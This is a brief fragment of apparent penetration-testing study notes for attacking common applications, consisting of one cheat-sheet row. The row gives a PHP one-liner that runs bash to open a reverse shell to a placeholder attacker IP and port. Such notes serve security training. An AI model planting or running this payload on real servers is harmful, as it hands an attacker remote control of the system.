...
![[images/logo_attacking_common_applications.png]]
...
| `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip address of attack box>/<port of choice> 0>&1'");` | PHP code that will execute a [[vuln--reverse-shell-bind-shell]] on a Linux-based system |
